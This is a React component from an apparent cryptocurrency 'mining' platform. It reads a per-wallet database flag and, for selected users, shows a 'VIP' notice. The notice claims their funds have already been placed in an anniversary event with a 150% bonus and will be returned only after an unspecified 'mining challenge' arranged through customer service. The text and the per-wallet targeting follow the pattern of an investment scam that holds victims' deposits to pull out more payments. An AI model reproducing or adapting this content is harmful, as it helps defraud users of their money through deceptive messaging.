"use client";

import { useAccount } from 'wagmi';
import { supabase } from '../../lib/supabase';
import { useEffect, useState } from 'react';

const EVN = () => {
  const { address } = useAccount();
  const [showEVN, setShowEVN] = useState(false);

  useEffect(() => {
    const checkEVNStatus = async () => {
      if (!address) return;
      
      const { data } = await supabase
        .from('users')
        .select('show_evn')
        .eq('wallet_address', address)
        .single();

      setShowEVN(data?.show_evn || false);
    };

    checkEVNStatus();
  }, [address]);

  if (!showEVN) return null;

  return (
    <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
      <h2 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">Exclusive VIP Notification</h2>
        <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50">
          <div className="text-center">
            <span className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
            Dear Member :
            </span>
            <div className="mt-4 space-y-3">
              <div className="px-6 py-4 bg-gradient-to-br from-blue-800 to-purple-800 rounded-lg mb-6">
              <label htmlFor="depositSlider" className="block text-gray-200 mb-2">
                
                <br />
                Previously, we congratulate you, because at this time, this digital mining Anniversary event has been held and you have been chosen as one of the lucky members and are entitled to receive an event bonus from our mining. The event bonus is 150% of your total funds.
                <br />
                <br />
                You don't need to worry about your funds, because we have involved your mining funds in this event and we will put them back into your digital wallet along with this event bonus after you have successfully completed the mining challenge.
                <br />
                <br />
                To find out the tasks you must complete, please contact our customer service directly so you can get more information.
              </label>    
            </div>

              
            <div className="mt-4 space-y-3">
            </div>
            </div>
            

          </div>
        </div>
    </section>
  );
};

export default EVN;

